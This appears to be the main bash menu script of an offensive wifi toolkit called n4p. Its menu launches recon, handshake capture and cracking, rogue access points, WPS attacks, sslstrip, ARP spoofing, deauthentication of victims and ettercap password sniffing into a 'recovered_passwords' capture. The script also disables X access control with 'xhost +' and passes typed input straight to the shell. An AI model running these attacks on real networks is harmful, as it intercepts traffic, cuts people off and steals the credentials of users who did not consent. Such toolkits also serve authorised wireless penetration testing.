#!/bin/bash
xhost +

#retrieve absolute path structures so we can use symlinks and config files
SOURCE="${BASH_SOURCE[0]}"
while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
    DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
    SOURCE="$(readlink "$SOURCE")"
    [[ $SOURCE != /* ]] && SOURCE="$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
DIR_CONF=/etc/n4p/
DIR_LOGO=/usr/share/n4p/
DIR_MODULES="${DIR}/modules/"

source ${DIR_MODULES}userspace

echo "${BLD_TEA}$(cat ${DIR_LOGO}opening.logo)${TXT_RST}"

SESSIONFOLDER=/tmp/n4p/ # Set our tmp working configuration directory and then build config files
[ ! -d "$SESSIONFOLDER" ] && mkdir "$SESSIONFOLDER"; mkdir -p "$SESSIONFOLDER" "${SESSIONFOLDER}logs"

trap killemAll INT HUP;

depends #Bring in all the variables from userspace

cut_choice() #This function parses the input commands in advanced mode for use with pre defined custom interactions
{
    CHOICE=${CHOICE:4:${#CHOICE}}
}

menu()
{
    if [[ $INTERFACE == "Basic" ]]; then
      echo -e "\n"
      echo -e "${BLD_WHT}
                /\#/\         '\\-//\`       |.===. '   
                /(${TXT_RST}${EYES}o o${TXT_RST}${BLD_WHT})\        (${EYES}o o${TXT_RST}${BLD_WHT})        ${TXT_RST}${PUR}{}${TXT_RST}${EYES}o o${TXT_RST}${PUR}{}${TXT_RST}${BLD_WHT}  
      +======ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo======+
      | ${TXT_RST}${BLD_TEA}1${TXT_RST}${BLD_WHT})  Set devices for use and attack                  |
      | ${TXT_RST}${BLD_TEA}2${TXT_RST}${BLD_WHT})  Perform wifi radius recon                       |
      | ${TXT_RST}${BLD_TEA}3${TXT_RST}${BLD_WHT})  Airodump-ng .cap file or Wash network           |
      | ${TXT_RST}${BLD_TEA}4${TXT_RST}${BLD_WHT})  Crack .cap and hashes                           |
      | ${TXT_RST}${BLD_TEA}5${TXT_RST}${BLD_WHT})  Attack or Launch AP                             |
      | ${TXT_RST}${BLD_TEA}6${TXT_RST}${BLD_WHT})  Enumerate the Firewall ${TXT_RST}${BLD_TEA}(Run this option last)${TXT_RST}${BLD_WHT}   |
      | ${TXT_RST}${BLD_TEA}7${TXT_RST}${BLD_WHT})  Kick everyone                                   |
      | ${TXT_RST}${BLD_TEA}8${TXT_RST}${BLD_WHT})  Start Ettercap Sniffer                          |
      | ${TXT_RST}${BLD_TEA}0${TXT_RST}${BLD_WHT})  EXIT                                            |
      +=====================================================+${TXT_RST}"
      read -p "Option: " CHOICE
    else
        echo ""
        read -p "${BLD_WHT}N4P${TXT_RST}${BLD_TEA}$ ${TXT_RST}" CHOICE
    fi

    if [[ $CHOICE == "advanced" || $CHOICE == "Advanced" ]]; then #Find out what the user wants then recall the menu arrangement based on this.
        INTERFACE="Advanced"
    elif [[ $CHOICE == "simple" || $CHOICE == "basic" || $CHOICE == "Simple" || $CHOICE == "Basic" ]]; then
        INTERFACE="Basic"
    #The current defined menu options are compleated
    ################################################################################################################################################
    #Now we look for user actions
    elif [[ $CHOICE == "quit" || $CHOICE == "exit" ]]; then
        killemAll $FAILSAFE
    elif [[ $CHOICE == "?" || $CHOICE == "help" || $CHOICE == "Help" ]]; then
        echo "Help! Commands and options are."
        echo "list modules | show modules"
        echo "use [ atom ]"
        echo "show options"
        echo "set var value"
        echo "run"
        echo "basic | simple"
        echo "advanced"
        echo "Any basic mode menu option number. 0-9"
        echo "Any bash command"
    elif [[ $CHOICE =~ ^[0-9]+$ ]]; then
	case $CHOICE in
	    0) killemAll $FAILSAFE ;;
	    1) sudo $EDITOR ${DIR_CONF}n4p.conf ;;
	    2) sudo xterm -bg black -fg DodgerBlue1 -T "Recon" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./recon ; bash\"" &>/dev/null & ;;
	    3) [[ $ATTACK == "WPS" ]] && sudo xterm -bg black -fg DodgerBlue1 -T "Wash" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./wash ; bash\"" &>/dev/null & || sudo xterm -bg black -fg DodgerBlue1 -T "Dump cap" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./dump ; bash\"" &>/dev/null & ;;
	    4) sudo xterm -bg black -fg DodgerBlue1 -T "Cracking" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./cracking ; bash\"" &>/dev/null & ;;
	    5) if [[ $ATTACK == "Handshake" || $ATTACK == "Karma" || -z $ATTACK ]]; then
		  sudo xterm -bg black -fg DodgerBlue1 -T "Airbase" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./airbase ; bash\"" &>/dev/null &
	       elif [[ $ATTACK == "WPS" ]]; then
		  sudo xterm -bg black -fg DodgerBlue1 -T "Bully" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./recon ; bash\"" &>/dev/null &
	       elif [[ $ATTACK == "SslStrip" ]]; then
		  echo -e "SSL Strip Log File\n" > ${SESSIONFOLDER}ssl.log 
		  sudo xterm -bg black -fg DodgerBlue1 -T "SSL Strip" -geometry 50x5 -e "bash -ic \"sslstrip -p -k -f lock.ico -w ${SESSIONFOLDER}ssl.log ; bash\"" &>/dev/null &
		  #sudo xterm -T "SSL Strip" -geometry 50x5 -e sslstrip -p -k -f lock.ico -w ${SESSIONFOLDER}ssl.log &>/dev/null &		
	       elif [[ $ATTACK == "WPE" ]]; then
		  sudo xterm -bg black -fg DodgerBlue1 -T "WPE" -geometry 50x5 -e "bash -ic \"${DIR_MODULES}./wpe ; bash\"" &>/dev/null & #sudo xterm -bg black -fg DodgerBlue1 -T "WPE" -geometry 90x20 -e ./modules/wpe  &>/dev/null &
	       elif [[ $ATTACK == "ArpSpoof" ]]; then
		  sudo xterm -bg black -fg DodgerBlue1 -T "ArpSpoof" -geometry 90x20 -e "bash -ic \"arpspoof -i $IFACE1 $ARP_VICTIM ; bash\"" &>/dev/null & #sudo xterm -T "Arpspoof $IFACE1 $AP_GATEWAY" -geometry 90x15 -e arpspoof -i $IFACE1 $ARP_VICTIM &>/dev/null &
	      fi
	      ;;
	     6) sudo xterm -bg black -fg DodgerBlue1 -T "iptables" -geometry 90x20 -e "bash -ic \"${DIR_MODULES}./firewall ; bash\"" &>/dev/null & ;;
	     7) sudo xtemr -bg black -fg DodgerBlue1 -T "Aireplay" -geometry 90x20 -e "bash -ic \"aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION ${IFACE1}mon ; bash\"" &>/dev/null & ;;
	     8) [[ ! -f ${SESSIONFOLDER}recovered_passwords.pcap ]] && sudo touch ${SESSIONFOLDER}recovered_passwords.pcap
		if [[ $BRIDGED == "True" ]]; then
		  sudo xterm -bg black -fg DodgerBlue1 -T "ettercap" -geometry 90x20 -e "bash -ic \"ettercap ${ETTERCAP_OPTIONS} -i ${BR_NAME} ; bash\"" &>/dev/null &
		elif [[ $AP_NAME == "AIRBASE" ]]; then
		  sudo xterm -bg black -fg DodgerBlue1 -T "ettercap at0" -geometry 90x20 -e "bash -ic \"ettercap -i at0 ${ETTERCAP_OPTIONS} -w ${SESSIONFOLDER}recovered_passwords.pcap ; bash\"" &>/dev/null &
		elif [[ $AP_NAME == "HOSTAPD" ]]; then
		  sudo xterm -bg black -fg DodgerBlue1 -T "ettercap $IFACE1" -geometry 90x20 -e "bash -ic \"ettercap $ETTERCAP_OPTIONS -i $IFACE1 -w ${SESSIONFOLDER}recovered_passwords.pcap ; bash\"" &>/dev/null &
		fi
		;;
	esac
    else
        ###########################################################################################################################
        # This section is all about advanced mode. We allow the user to run custom modules and interact with the shell directly
        ###########################################################################################################################
        if [[ $INTERFACE == "Advanced" ]]; then
            if [[ $CHOICE == "use"* ]]; then
                cut_choice $CHOICE
                echo "use=$CHOICE"
                [[ ! -f ${DIR_MODULES}$CHOICE ]] && echo "${BLD_TEA}JarJar, yousa seem to be confused.${TXT_RST}" || RUN=$CHOICE
            elif [[ $CHOICE == "run" ]]; then # Check if the CHOICE is empty before trying to execute
                [[ -n $CHOICE ]] && sudo xterm -bg black -fg DodgerBlue1 -T "N4P Advanced runtime" -geometry 65x15 -e "bash -ic \"${DIR_MODULES}./$RUN ; bash\"" &>/dev/null & || echo "${BLD_TEA}Nothing to do!${TXT_RST}"
            elif [[ $CHOICE == "show options" ]]; then
		[[ -n $RUN ]] && grep get_name\ \" ${DIR_MODULES}$RUN | cut -d '"' -f 2 || echo "${BLD_TEA}Nothing to do!${TXT_RST}"
            elif [[ $CHOICE == "list modules" || $CHOICE == "show modules" ]]; then
		printf %s "$(ls ${DIR_MODULES})"
            elif [[ $CHOICE = set* ]]; then #We may in future make variables dynamic from the module
		cut_CHOICE $CHOICE
                VAR=$(echo "$CHOICE" | cut -d ' ' -f 1)
                STR=$(echo "$CHOICE" | cut -d ' ' -f 2)
                printf ${VAR}=${STR}
		#Don't know how to make this work yet inside memory. Trying to avoid using sed replace and reload of config every option change.
            else
                printf %s "$($CHOICE)"
                echo -e "\n\n"
                menu
            fi
        else
            echo "${BLD_TEA}I'm confused.${TXT_RST}"
            echo "${BLD_TEA}You may be a Ninja, Why not try Advanced mode!${TXT_RST}"
        fi
    fi
    menu
}

killemAll()
{
    echo ""
    if [[ $1 != $FAILSAFE ]]; then
        clear
        menu
    else
        sudo ${DIR_MODULES}./rebuild_network
        xhost -
        echo "${BLD_TEA}$(cat ${DIR_LOGO}/zed.logo)${TXT_RST}"
        exit 0
    fi
}
menu
